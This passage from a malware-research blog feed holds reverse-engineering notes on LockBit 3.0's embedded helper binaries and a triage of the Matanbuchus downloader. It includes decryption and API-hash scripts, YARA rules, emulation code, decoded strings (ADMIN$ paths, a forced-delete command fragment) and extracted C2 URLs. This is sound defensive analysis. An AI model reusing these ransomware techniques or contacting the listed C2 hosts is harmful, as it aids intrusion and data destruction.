x07](....)(?P&lt;raw&gt;(?: xc7[ x40- x47].....){1,})&#39; for match in re.finditer(egg, file_data): data_offset = match.start() tmp_data = b&#39;&#39; tmp_data += match.group(1) g2 = match.group(2) split_key = g2[:2] for s in g2.split(split_key): tmp_data += s[-4:] ptxt_data = decrypt_str(tmp_data, decryption_key) if ptxt_data[-2:] == b&#39; x00 x00&#39;: ptxt_data = ptxt_data.decode(&#39;utf-16le&#39;) elif len(ptxt_data) == 16: if any(not c for c in ptxt_data[::2]): ptxt_data = str(uuid.UUID(bytes_le=ptxt_data)) if type(ptxt_data) == str: ptxt_data = ptxt_data.replace(&#39; x00&#39;,&#39;&#39;) else: ptxt_data = ptxt_data.replace(b&#39; x00&#39;,b&#39;&#39;) try: ptxt_data = ptxt_data.decode(&#39;utf-8&#39;) except: continue out[data_offset] = ptxt_data return out get_strings(file_data) . {28532: &#39; *.dll&#39;, 28715: &#39;drv&#39;, 32313: &#39;{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 35620: &#39;cb8555cc-9128-11d1-ad9b-00c04fd8fdff&#39;, 35658: &#39;dc12a687-737f-11cf-884d-00aa004b2e24&#39;, 35696: &#39;674b6698-ee92-11d0-ad71-00c04fd8fdff&#39;, 35734: &#39;44aca674-e8fc-11d0-a07c-00c04fb68820&#39;, 35775: &#39;__ProviderArchitecture&#39;, 35872: &#39;ROOT CIMV2&#39;, 35927: &#39;ID&#39;, 35954: &#39;SELECT * FROM Win32_ShadowCopy&#39;, 36079: &#39;WQL&#39;, 36106: &#34;Win32_ShadowCopy.ID=&#39;%s&#39;&#34;, 37545: &#39;Global %.8x%.8x%.8x%.8x&#39;, 38303: &#39;Times New Roman&#39;, 39105: &#39;.bmp&#39;, 39328: &#39;Control Panel Desktop&#39;, 39487: &#39;WallPaper&#39;, 39589: &#39;WallpaperStyle&#39;, 39996: &#39;-wall&#39;, 40044: &#39;-pass&#39;, 40352: &#39;WinSta0 Default&#39;, 41849: &#39;EventLog&#39;, 42071: &#39;SOFTWARE Microsoft Windows CurrentVersion WINEVT Channels&#39;, 42287: &#39;SYSTEM CurrentControlSet Services EventLog&#39;, 42454: &#39;O:BAG:SYD:(A;;0x1;;;SY)(A;;0x5;;;BA)(A;;0x1;;;LA)&#39;, 42639: &#39;Enabled&#39;, 42677: &#39;ChannelAccess&#39;, 44910: &#39;-gspd&#39;, 44932: &#39;-psex&#39;, 44980: &#39;-pass&#39;, 45229: &#39; . pipe %s&#39;, 48094: &#39;Z: &#39;, 48310: &#39;00021401-0000-0000-c000-000000000046&#39;, 48348: &#39;000214f9-0000-0000-c000-000000000046&#39;, 48386: &#39;0000010b-0000-0000-c000-000000000046&#39;, 51936: &#39;dllhost.exe&#39;, 52206: &#39;Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC&#39;, 52730: &#39;%s.README.txt&#39;, 53030: &#39;WINSPOOL&#39;, 53143: &#39;Consolas&#39;, 53624: &#39;office&#39;, 53677: &#39;onenote&#39;, 56281: &#39;Control Panel International&#39;, 56455: &#39;LocaleName&#39;, 56552: &#39;sLanguage&#39;, 56739: &#39;SOFTWARE Microsoft Windows NT CurrentVersion&#39;, 56952: &#39;ProductName&#39;, 57788: &#39;‚∏•Á†∏‚∏•Á†∏‚∏•Á†∏‚∏•Á†∏%&#39;, 58220: &#39;POST&#39;, 59193: &#39;‰âÅ‰ëÉ‰ôÖ‰°á‰©â‰±ã‰πçÂÅèÂâëÂëìÂôïÂ°óÂ©ôÊâ°Êë£Êô•Ê°ßÊ©©Ê±´Êπ≠ÁÅØÁâ±Áë≥ÁôµÁ°∑Á©π u3130„å≤„î¥„ú∂„§∏&#39;, 59315: &#39;%s=%s&#39;, 59650: &#39;Áå•‚îΩs&#39;, 59674: &#39;‚∏•Á†∏‚∏•Á†∏‚∏•Á†∏‚∏•Á†∏%&#39;, 59722: &#39;‰âÅ‰ëÉ‰ôÖ‰°á‰©â‰±ã‰πçÂÅèÂâëÂëìÂôïÂ°óÂ©ôÊâ°Êë£Êô•Ê°ßÊ©©Ê±´Êπ≠ÁÅØÁâ±Áë≥ÁôµÁ°∑Á©π u3130„å≤„î¥„ú∂„§∏&#39;, 60261: &#39;Áî•‚îÆu&#39;, 60627: &#39;Áî•‚îÆu&#39;, 64353: &#39;‰âÅ‰ëÉ‰ôÖ‰°á‰©â‰±ã‰πçÂÅèÂâëÂëìÂôïÂ°óÂ©ôÊâ°Êë£Êô•Ê°ßÊ©©Ê±´Êπ≠ÁÅØÁâ±Áë≥ÁôµÁ°∑Á©π u3130„å≤„î¥„ú∂„§∏&#39;, 67512: &#39; %s &#39;, 67796: &#39;LDAP://rootDSE&#39;, 67918: &#39;defaultNamingContext&#39;, 68033: &#39;LDAP://CN=Computers,&#39;, 68220: &#39;dNSHostName&#39;, 68275: &#39; %s &#39;, 70308: &#39; . pipe {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 72037: &#39;ExchangeInstallPath&#39;, 72147: &#39;Program Files&#39;, 72256: &#39;Mailbox&#39;, 73166: &#39;SOFTWARE %s&#39;, 73221: &#39;hScreen&#39;, 76670: &#39;%02X&#39;, 76908: &#39;Software Microsoft Windows CurrentVersion Group Policy Status&#39;, 79370: &#39; . pipe %s&#39;, 79560: &#39;-safe&#39;, 80461: &#39; %s.%s &#39;, 80571: &#39; . pipe %s&#39;, 80877: &#39;%s_IPC$&#39;, 81005: &#39;{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 81867: &#39;WinSta0 Default&#39;, 82438: &#39;ADMIN$&#39;, 82479: &#39;IPC$&#39;, 82513: &#39;%spipe %s&#39;, 82561: &#39;%%SystemRoot%% Temp %s.exe -k LocalServiceNetworkRestricte&#39;, 82854: &#39;%sADMIN$ Temp %s.exe&#39;, 82944: &#39;%sADMIN$ Temp&#39;, 84119: &#39;%02X&#39;, 84334: &#39;LDAP://rootDSE&#39;, 84439: &#39;defaultNamingContext&#39;, 84570: &#39;LDAP://CN=Policies,CN=System,%s&#39;, 84779: &#39;displayName&#39;, 84962: &#39;distinguishedName&#39;, 85218: &#39;%02X&#39;, 85476: &#39;Software Microsoft Windows CurrentVersion Group Policy Status&#39;, 85937: &#39;ADMIN$&#39;, 86010: &#39;IPC$&#39;, 86064: &#39;%spipe %s&#39;, 86266: &#39;%sADMIN$ Temp&#39;, 86369: &#39;%sADMIN$ Temp %s.exe&#39;, 86647: &#39;%%SystemRoot%% Temp %s.exe&#39;, 87626: &#39;LDAP://rootDSE&#39;, 87731: &#39;defaultNamingContext&#39;, 88054: &#39;File&#39;, 88146: &#39;Services&#39;, 88235: &#39;Preferences&#39;, 88306: &#39;ScheduledTasks&#39;, 88418: &#39;NetworkShare&#39;, 88545: &#39;„Ä•Êê¥‚î≠„à∞‚µ§„Ä•Êê≤‚î†„à∞„©§„Ä•Êê≤‚î∫„à∞d&#39;, 88693: &#39;{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 89115: &#39;GPT.INI&#39;, 89231: &#39;2621892&#39;, 89255: &#39;[General] r nVersion=%s r ndisplayName=%s r n&#39;, 90228: &#39; %s sysvol %s scripts &#39;, 90805: &#39;Âê•Êµ•‰ë∞Áâ©%&#39;, 91413: &#39;NT AUTHORITY SYSTEM&#39;, 92018: &#39;Registry.pol&#39;, 92077: &#39;comment.cmtx&#39;, 93391: &#39;gPCMachineExtensionNames&#39;, 93627: &#39;gPCUserExtensionNames&#39;, 93846: &#39;versionNumber&#39;, 93905: &#39;2621892&#39;, 94425: &#39;LDAP://%s/DC=%s,DC=%s&#39;, 94666: &#39;LDAP://DC=%s,DC=%s&#39;, 94837: &#39;LDAP://CN=%s,CN=Policies,CN=System,DC=%s,DC=%s&#39;, 95225: &#39;ea502723-a23d-11d1-a7d3-0000f87571e3&#39;, 95266: &#39;ea502722-a23d-11d1-a7d3-0000f87571e3&#39;, 95739: &#39;ADMIN$&#39;, 95804: &#39;IPC$&#39;, 95862: &#39;%spipe %s&#39;, 96096: &#39;%sADMIN$ Temp&#39;, 96203: &#39;%sADMIN$ Temp %s.exe&#39;, 96539: &#39;%%SystemRoot%% Temp %s.exe&#39;, 97082: &#39;ea502723-a23d-11d1-a7d3-0000f87571e3&#39;, 97123: &#39;ea502722-a23d-11d1-a7d3-0000f87571e3&#39;, 97244: &#39;LDAP://%s&#39;, 97583: &#39;-gdel&#39;, 97631: &#39;-pass&#39;} . Analysis of The Embedded PE Files . Our samples hash: d641ad955ef4cff5f0239072b3990d47e17b9840e07fd5feea93c372147313c5. . The sample uses a dynamic API resolving routine similar to the main Lockbit binary, all APIs are resolved in a &quot;API table&quot;, though the actual API hash algorithm is different. . @c3rb3ru5d3d53c converted this into a python script that will generate the API hashes for you. She also has a nice blog post. . The API Hash Algorithm . The hash algorithm has a hard coded key which can be modified via an optional seed, the rest of the algorthm is a simple ROT-13 add, same as the lockbit main. This hash algorithm is used to hash the lowercase string of the DLL, which is then used as the seed for the API hashes. . Example from c3rb3ru5d3d53c&#39;s blog post with xor key 0x3B029FD4: . 0xaae0cefb -&gt; kernel32.dll FindFirstFileExW . def ror(n,rotations=1,width=32): return (2**width-1)&amp;(n&gt;&gt;rotations|n&lt;&lt;(width-rotations)) def hash_algo(string, seed): string = string + b&#39; x00&#39; result = 0xC8B32494 ^ seed for c in string: result = ror(result, rotations=0x0d, width=32) result = (result + c) &amp; 0xffffffff if c == 0x00: break return result def get_api_hash(dll_name, api_name, seed, xor_key): dll_name = dll_name.lower() dll_hash = hash_algo(dll_name, seed) tmp_hash = hash_algo(api_name, dll_hash) return (~tmp_hash &amp; 0xffffffff) ^ xor_key . This algorithm is now in hashdb. . Obfuscated VTables . For some reason the developers create &quot;obfuscated&quot; jumps to the exisiting vtables in the code. This is done by taking the function addresses in the vtables and encrypting them, then the encrypted address is placed in some hardcoded shellcode that is used to decrypt and call the address. Each encrypted address/shellcode blob is then called from the code creating some simple obfuscated &quot;redirect&quot; to the actual vtable function. . . String Decryption . Stolen from @c3rb3ru5d3d53c with &lt;3 . import struct def decrypt_str(data): result = b&#39;&#39; if (len(data) % 4)!= 0: return None for i in range(0, len(data), 4): dword = struct.unpack(&#39;&lt;I&#39;, data[i:i+4])[0] dword = (~(dword ^ 0x3B029FD4) &amp; 0xffffffff) result += dword.to_bytes(4, byteorder=&#39;little&#39;) return result dd = struct.pack(&#39;&lt;I&#39;,0x397F36FB) dd += struct.pack(&#39;&lt;I&#39;,0x0D5339D3E) dd += struct.pack(&#39;&lt;I&#39;,0x0A4FFA480) dd += struct.pack(&#39;&lt;I&#39;,0x9788FEA7) dd = struct.pack(&#39;&lt;I&#39;,0x0C4B96067) dd += struct.pack(&#39;&lt;I&#39;,0x0C4AD606A) dd += struct.pack(&#39;&lt;I&#39;,0x0C4D26011) dd += struct.pack(&#39;&lt;I&#39;,0x0C48F6004) dd += struct.pack(&#39;&lt;I&#39;,0x0C4926044) dd += struct.pack(&#39;&lt;I&#39;,0x0C4B9605F) dd += struct.pack(&#39;&lt;I&#39;,0x0C4B86078) dd += struct.pack(&#39;&lt;I&#39;,0x0C4FD602B) decrypt_str(dd) . b&#39;L x00D x00A x00P x00: x00/ x00/ x00r x00o x00o x00t x00D x00S x00E x00 x00 x00 x00 x00&#39; . import re import struct # C7 00 (?? ?? ?? ??) # C7 40 ?? (?? ?? ?? ??) test_data = unhex(&#39;8d8520ffffffc7006760b9c4c740046a60adc4c740081160d2c4c7400c0460bec4c740106560c0c4c740147b6092c4c74018476094c4c7401c486094c4c740204e608ec4c740240760bec4c740286560c0c4c7402c786084c4c74030586089c4c740344e6090c4c740380760d8c4c7403c5860fdc48b15785140006a1050&#39;) #egg = rb&quot;(?P&lt;bytes&gt;(?P&lt;opcode_byte&gt;.)(?:.){1,2}(?P&lt;imm_data&gt;.){4})&quot; out = b&#39;&#39; egg = br&#39; xc7 x00(....)(?P&lt;raw&gt;(?: xc7 x40.....){1,})&#39; for match in re.finditer(egg, test_data): out += match.group(1) g2 = match.group(2) for s in g2.split(b&#39; xc7 x40&#39;): out += s[-4:] decrypt_str(out) . b&#39;L x00D x00A x00P x00: x00/ x00/ x00C x00N x00= x00P x00o x00l x00i x00c x00i x00e x00s x00, x00C x00N x00= x00S x00y x00s x00t x00e x00m x00, x00% x00s x00 x00 x00&#39; . import uuid file_data = open(&#39;/tmp/d641ad955ef4cff5f0239072b3990d47e17b9840e07fd5feea93c372147313c5_pe.bin&#39;, &#39;rb&#39;).read() #if all(not character for character in b&quot;A x00B x00C x00D x00E x00F x00G x00 x00&quot;[1::2]): # print(&quot;not guid&quot;) # output: bytes = b&quot;&quot; # for match in re.finditer(rb&quot;(?P&lt;opcode&gt;[ xC7])(?:[ x00- x03, x06- x07]|[ x40- x43, x46- x47,].)(?P&lt;imm_data&gt;.{4})&quot;, b&quot; xC7 x07sihT xC7 x40 x20 si xC7 x40 x20ts a xC7 x40 x20gnir&quot;): # output += match.group(&quot;imm_data&quot;)[::-1] # print(output) # decrypt_string here # &gt;&gt;&gt; b&#39;This is a string&#39; # The registers used for the stack string are # 0 1 2 3 6 7 def get_strings(file_data): out = {} egg = br&#39; xc7[ x00- x07](....)(?P&lt;raw&gt;(?: xc7[ x40- x47].....){1,})&#39; for match in re.finditer(egg, file_data): data_offset = match.start() tmp_data = b&#39;&#39; tmp_data += match.group(1) g2 = match.group(2) split_key = g2[:2] for s in g2.split(split_key): tmp_data += s[-4:] ptxt_data = decrypt_str(tmp_data) if ptxt_data[-2:] == b&#39; x00 x00&#39;: ptxt_data = ptxt_data.decode(&#39;utf-16le&#39;) elif len(ptxt_data) == 16: if any(not c for c in ptxt_data[::2]): ptxt_data = str(uuid.UUID(bytes_le=ptxt_data)) if type(ptxt_data) == str: ptxt_data = ptxt_data.replace(&#39; x00&#39;,&#39;&#39;) else: ptxt_data = ptxt_data.replace(b&#39; x00&#39;,b&#39;&#39;) try: ptxt_data = ptxt_data.decode(&#39;utf-8&#39;) except: continue out[data_offset] = ptxt_data return out get_strings(file_data) . {2962: &#39; *.dll&#39;, 3152: &#39;drv&#39;, 7065: &#39;ea502723-a23d-11d1-a7d3-0000f87571e3&#39;, 7107: &#39;ea502722-a23d-11d1-a7d3-0000f87571e3&#39;, 7232: &#39;LDAP://%s&#39;, 7804: &#39;/C DEL /F /Q &#39;, 7900: &#39; &gt;&gt; NUL&#39;, 7991: &#39; cmd.exe&#39;, 8348: &#39;LDAP://rootDSE&#39;, 8459: &#39;defaultNamingContext&#39;, 8596: &#39;LDAP://CN=Policies,CN=System,%s&#39;, 8817: &#39;displayName&#39;, 9023: &#39;distinguishedName&#39;, 9801: &#39;File&#39;, 9898: &#39;Preferences&#39;, 10193: &#39;Áâ¶ÊµØÊÖêÊ°¥‚àΩ&#39;, 10661: &#39;%s_IPC$&#39;, 10812: &#39; . pipe {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;} . IDA Python Script to Label Strings . def set_hexrays_comment(address, text): &#39;&#39;&#39; set comment in decompiled code &#39;&#39;&#39; cfunc = idaapi.decompile(address) tl = idaapi.treeloc_t() tl.ea = address tl.itp = idaapi.ITP_SEMI cfunc.set_user_cmt(tl, text) cfunc.save_user_cmts() def set_comment(address, text): ## Set in dissassembly idc.set_cmt(address, text,0) ## Set in decompiled data set_hexrays_comment(address, text) string_map = {} for offset,string_value in string_map.items(): va = idaapi.get_fileregion_ea(offset) set_comment(va, string_value) . Functionality -- STILL TO BE COMPLETED . The binary registers itself as a service, then creates a named pipe which will recieve 4 bytes to be be converted into a DWORD time value and sent to a thread. The thread&#39;s sole purpose is to sleep for the DWORD amount of time. The threads are also hidden from the debugger. It is not clear why this functionality exists, maybe as some sort of time delay? . The named pipe name is generated using the MD5 of the string | . | . 0 . _IPC$ The MD5 is then converted into a &quot;GUID&quot; format following this pattern | . . pipe {GUID} The binary scans AD via the COM interface and I think accesses the ransom binary remotely from the AD server | The Restart Manager is used to collect a list of services and processes that block the ransomware execution which are then terminated | I don&#39;t know why they don&#39;t launch the ransomware? | The ransomware is then overwritten with garbage and deleted | . Tools . Welcome to MagNumDB is useful for looking up COM GUIDs | . References . Restart manager | . Analysis of The 2nd PE . Sample: 63c8efca0f52ebea1b3b2305e17580402f797a90611b3507fab6fffa7f700383 . String Decryption . The string decryption algorithm is the same but uses a different key. . import uuid import re import struct file_data = open(&#39;/tmp/63c8efca0f52ebea1b3b2305e17580402f797a90611b3507fab6fffa7f700383_pe.bin&#39;, &#39;rb&#39;).read() decryption_key = 0x29009FE6 def decrypt_str(data, decryption_key): result = b&#39;&#39; if (len(data) % 4)!= 0: return None for i in range(0, len(data), 4): dword = struct.unpack(&#39;&lt;I&#39;, data[i:i+4])[0] dword = (~(dword ^ decryption_key) &amp; 0xffffffff) result += dword.to_bytes(4, byteorder=&#39;little&#39;) return result def get_strings(file_data): out = {} egg = br&#39; xc7[ x00- x07](....)(?P&lt;raw&gt;(?: xc7[ x40- x47].....){1,})&#39; for match in re.finditer(egg, file_data): data_offset = match.start() tmp_data = b&#39;&#39; tmp_data += match.group(1) g2 = match.group(2) split_key = g2[:2] for s in g2.split(split_key): tmp_data += s[-4:] ptxt_data = decrypt_str(tmp_data, decryption_key) if ptxt_data[-2:] == b&#39; x00 x00&#39;: ptxt_data = ptxt_data.decode(&#39;utf-16le&#39;) elif len(ptxt_data) == 16: if any(not c for c in ptxt_data[::2]): ptxt_data = str(uuid.UUID(bytes_le=ptxt_data)) if type(ptxt_data) == str: ptxt_data = ptxt_data.replace(&#39; x00&#39;,&#39;&#39;) else: ptxt_data = ptxt_data.replace(b&#39; x00&#39;,b&#39;&#39;) try: ptxt_data = ptxt_data.decode(&#39;utf-8&#39;) except: continue out[data_offset] = ptxt_data return out get_strings(file_data) . {2914: &#39; *.dll&#39;, 3104: &#39;drv&#39;, 5184: &#39;/C DEL /F /Q &#39;, 5280: &#39; &gt;&gt; NUL&#39;, 5371: &#39; cmd.exe&#39;, 6137: &#39;%s_IPC$&#39;, 6283: &#39;{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 6619: &#39; %s.%s &#39;, 6743: &#39; . pipe %s&#39;, 7043: &#39;TMP&#39;} . IDA Python Script to Label Strings . string_map = {} def set_hexrays_comment(address, text): &#39;&#39;&#39; set comment in decompiled code &#39;&#39;&#39; cfunc = idaapi.decompile(address) tl = idaapi.treeloc_t() tl.ea = address tl.itp = idaapi.ITP_SEMI cfunc.set_user_cmt(tl, text) cfunc.save_user_cmts() def set_comment(address, text): ## Set in dissassembly idc.set_cmt(address, text,0) ## Set in decompiled data set_hexrays_comment(address, text) for offset,string_value in string_map.items(): va = idaapi.get_fileregion_ea(offset) set_comment(va, string_value) . Functionality . The binary opens a named pipe with a generated name (same as the other embeded binary). . 0 . _IPC$ . pipe {GUID} Then a handle to the explorer.exe or lsass.exe process is opened and the named pipe handle is duplicated into the process. This is a trick that keeps the named pipe open indefinitely possibly a version of this trick. . Analysis of The 3rd PE . Sample: 917e115cc403e29b4388e0d175cbfac3e7e40ca1742299fbdb353847db2de7c2 . Obfuscation . This sample is obfuscated even once it has been decrypted and decompressed. Lockbit writes it to a temporary file in %APPDATA% then launches it as a suspended process. The supended process memory is then deobfuscated and the processes is then allowed to execute. . We uploaded the final deobfuscated binary to malshare b1ae7316e73ceebb1b429dd707387bfd12fd489c2af0ed1083895195e7baf119 . Strings . import uuid import re import struct file_data = open(&#39;/tmp/lock3_dump_scy_005A0000.bin&#39;, &#39;rb&#39;).read() decryption_key = 0x3105DFDE def decrypt_str(data, decryption_key): result = b&#39;&#39; if (len(data) % 4)!= 0: return None for i in range(0, len(data), 4): dword = struct.unpack(&#39;&lt;I&#39;, data[i:i+4])[0] dword = (~(dword ^ decryption_key) &amp; 0xffffffff) result += dword.to_bytes(4, byteorder=&#39;little&#39;) return result def get_strings(file_data): out = {} egg = br&#39; xc7[ x00- x07](....)(?P&lt;raw&gt;(?: xc7[ x40- x47].....){1,})&#39; for match in re.finditer(egg, file_data): data_offset = match.start() tmp_data = b&#39;&#39; tmp_data += match.group(1) g2 = match.group(2) split_key = g2[:2] for s in g2.split(split_key): tmp_data += s[-4:] ptxt_data = decrypt_str(tmp_data, decryption_key) if ptxt_data[-2:] == b&#39; x00 x00&#39;: ptxt_data = ptxt_data.decode(&#39;utf-16le&#39;) elif len(ptxt_data) == 16: if any(not c for c in ptxt_data[::2]): ptxt_data = str(uuid.UUID(bytes_le=ptxt_data)) if type(ptxt_data) == str: ptxt_data = ptxt_data.replace(&#39; x00&#39;,&#39;&#39;) else: ptxt_data = ptxt_data.replace(b&#39; x00&#39;,b&#39;&#39;) try: ptxt_data = ptxt_data.decode(&#39;utf-8&#39;) except: continue out[data_offset] = ptxt_data return out get_strings(file_data) . {2506: &#39; *.dll&#39;, 2696: &#39;drv&#39;, 5587: &#39;%.8X&#39;, 6026: &#39;/C DEL /F /Q &#39;, 6122: &#39; &gt;&gt; NUL&#39;, 6214: &#39; cmd.exe&#39;, 6520: &#39; . pipe {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;, 7497: &#39;Global {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}&#39;} . Functionality . The binary opens a named pipe using the same MD5-to-GUID technique as the other binaries and reads a command from the pipe. The command has the following format. . DWORD flag_cleanup DWORD flag_shutdown DWORD flag_fill_free_disk_space DWORD flag_shred_file HANDLE hWait char buffFileName[520] . The flags are used to control the functionality of the binary. . The cleanup flag is responsible for cleaning the file up. | The shutdown flag causes the system to shutdown. | The fill free disk space flag creates a random file on each of the removable and fixed disks and fills it with random data to overwrite the free space on the disk. | The shred file flag deleates a file by overwriting it with random data to prevent forensic recovery. | . The wait handle is used to sleep the process until the handle is released, and the file name buffer is used to pass the name of the file to shred. . The purpose of this binary is to delete a file in a manner that makes it forensically impossible to recover. This is used to delete the ransomware binary itself once the encryption is complete. Likely an attempt to prevent reverse engineering of the binary and the potential discovery of any crytographic flaws in the ransomware&#39;s encryption algorithm. . &lt;/div&gt;",
            "url": "https://research.openanalysis.net/lockbit/lockbit3/yara/triage/ransomware/2022/07/07/lockbit3.html",
            "relUrl": "/lockbit/lockbit3/yara/triage/ransomware/2022/07/07/lockbit3.html",
            "date": " ‚Ä¢ Jul 7, 2022"
        }
        
    
  
    
        ,"post42": {
            "title": "Matanbuchus Triage Notes",
            "content": ". Overview . Matanbuchus is a malware downloader that has been observed as the final loading stage in multiple phishing campaigns. There are two components, a Matanbuchus loader intented to load the Matanbuchus downloader. Once the downloader is executed it makes an HTTP request to the C2 with some victim info, and downloads the final payload. . According to DCSO CyTec... . Matanbuchus is the name given to a Malware-as-a-Service sold on Russian-speaking cybercriminal forums. Starting at a rental price of $2,500, the malware consists of an obfuscated two-stage loader which has been deployed in conjunction with Qakbot and Cobalt Strike payloads. . . References . Malspam pushes Matanbuchus malware, leads to Cobalt Strike | Not Packed (UnpacMe) | f8cc2cf36e193774f13c9c5f23ab777496dcd7ca588f4f73b45a7a5ffa96145e | Matanbuchus: Malware-as-a-Service with Demonic Intentions | A deal with the devil: Analysis of a recent Matanbuchus sample | MATANBUCHUS: Another Loader As A Service Malware | List of known versions of Windows DLLs | Free Yara Scan Service | MalwareBazaar Client | . Analysis . The DLL has an export called HackCheck that uses OutputDebugStringA to print start dll HackCheck | The sample uses API hashing with FNV1a hash algo to resolve API calls | . Yara Rule . This yara rule is very brittle and needs lots of testing/refining . rule matanbuchus { meta: description = &quot;Identifies matanbuchus&quot; strings: // recursive fnv1 hash // 69 C2 93 01 00 01 imul eax, edx, 1000193h // 50 push eax // B9 01 00 00 00 mov ecx, 1 // C1 E1 00 shl ecx, 0 $x1 = { 69 c2 93 01 00 01 50 b9 01 00 00 00 c1 e1 00 } // string decryption // 0F BE 1C 01 movsx ebx, byte ptr [ecx+eax] // 33 DE xor ebx, esi // 6A 00 push 0 // 6A 01 push 1 $x2 = { 0f be 1c 01 33 de 6a 00 6a 01 } condition: all of ($x*) } . Yara Rule Revised . rule matanbuchus { meta: description = &quot;Identifies matanbuchus&quot; strings: // fnv1 hash // 69 C2 93 01 00 01 imul eax, edx, 1000193h // // 69 C0 93 01 00 01 imul eax, 1000193h $x1 = { 69 ?? 93 01 00 01 } //pe loader $x2 = { B8 4D 5A 00 00 } $x3 = { 81 38 50 45 00 00 } //InternetCloseHandle $x5 = { 66 E9 DD 4D } //InternetOpenUrlA $x6 = { BC 8B CF F4 } //InternetCheckConnectionA $x7 = { 3F 82 58 52 } //InternetReadFile $x8 = { 66 E9 DD 4D } condition: all of ($x*) } . String Decryption . Simple Decryption . Some strings are built as stack strings then copied into a buffer and returned from a function. The returned buffer is then decrypted directly using a simple XOR decryption routine where the first byte is the key. . import struct data = b&#39;jl8|tt8Py{s[p}{s&#39; key = struct.pack(&#39;&lt;I&#39;,0x796C6B18) data = key[1:] + data out = [] for i in data: out.append(i ^ key[0]) bytes(out) . b&#39;start dll HackCheck&#39; . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Complex Decryption . Other strings are also build from stack strings in a function and returned in a buffer, but these strings are decrypted with a second function call to a decryption function. To handle these more complex strings, we will use dumpulator . from dumpulator import Dumpulator import struct import re import pefile file_data = open(&#39;/tmp/mat.bin&#39;,&#39;rb&#39;).read() pe = pefile.PE(data=file_data) . dp = Dumpulator(&quot;/tmp/mat.dmp&quot;, quiet=True) fn_get_string = 0x708641C0 ss_start = 0x708631B2 ss_end = 0x708632AA dp.start(ss_start, end=ss_end) ss = dp.read(dp.regs.ebp-0x50, 0x48) ss = bytes(ss)[:0x3e] buff = dp.allocate(0x3e) dp.write(buff, ss) fn_dec_str = 0x7086F3D0 dp.call(fn_dec_str, [buff, 0x3e, 0x0, 0x7ebbfa3, 0x1010101]) dp.read(buff,0x3e) . Failed to read module data . bytearray(b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;) . Dumpulator Notes . The DLL uses thread safe functions that require a call into EnterCriticalSection and LeaveCriticalSection. Because our dump was taken before the DLL was initialized the critical section object was not initialized and this causes Dumpulator to crash. . First we tried just calling the initialization function in the DLL to setup this object (also tried calling the wrapper functions for InitializeCriticalSectionEx) but these all led to crashes (we could implement some syscalls and try again but we are lazy! . Our solution is to just patch out the EnterCriticalSection and LeaveCriticalSection calls in the loaded ntdll using a simple return 0. . 33 C0 xor eax,eax C2 04 00 ret 4 . Dumpulator Patching Out Functions . dp = Dumpulator(&quot;/tmp/mat.dmp&quot;, quiet=True) ntdll_start = 0x77a10000 patch_bytes = b&#39; x33 xC0 xC2 x04 x00&#39; ptr_RtlLeaveCriticalSection = 0x77A5FFF0 ptr_RtlEnterCriticalSection = 0x77A5FDF0 get_str_fn = 0x70861000 #tohex(dp.read(ntdll_init_crit_sec,10)) dp.write(ptr_RtlLeaveCriticalSection, patch_bytes) dp.write(ptr_RtlEnterCriticalSection, patch_bytes) dp.call(get_str_fn) . Failed to read module data unmapped read from 8[4], cip = 77a6693a error: Invalid memory read (UC_ERR_READ_UNMAPPED), cip = 77a6693a . 134217727 . Dumpulator Implementing Syscalls to Load DLL . Our patching method sort of worked but there is other initializations stuff that was causing more crashes. We are going to try and just implement the syscalls that we need to actually emulate the full DLL load routine and see if that works better. . from dumpulator import Dumpulator, syscall from dumpulator.native import * @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS dp = Dumpulator(&quot;/tmp/mat2.dmp&quot;, quiet=True) dll_base_addr = 0x71950000 dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) get_str_fn = 0x71951000 dp.read_str(dp.call(get_str_fn)) . Failed to read module data . &#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx&#39; . Finding Encrypted Stack Strings . egg = rb&#39;( xC6 x45..){4}&#39; egg = rb&#39; x55 x8b xec x83 xec x08 x33 xc0 x88 x45 xff&#39; stack_string_offsets = [] for m in re.finditer(egg, file_data): fn_offset = m.start() fn_addr = pe.get_rva_from_offset(fn_offset) + dll_base_addr tmp_str = dp.read_str(dp.call(fn_addr)) print(tmp_str) . https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx https://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/auth.aspx DllRegisterServer http://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/home.aspx http://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx . Revising Our Config Extractor . Now that we have a base config extractor we need to test this across multiple samples/versions of the malware to make sure it is robust enough. . Our initial sample was f8cc2cf36e193774f13c9c5f23ab777496dcd7ca588f4f73b45a7a5ffa96145e. . We have collected the following samples to triage: . b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e | c41f7b7ec0909d5c21107ddebc2fe84dbc137f701b42943c1a5e69f5d50e05ab | b4e7710488c2b7aaa71688b8bd546410af07a215c2e835e8dfbe24887186bd4f | 60f030597c75f9df0f7a494cb5432b600d41775cfe5cf13006c1448fa3a68d8d | 58a673023bbc7f2726e3b7ac917a43d9306692dc87b638ee21b98705a3262ccd | 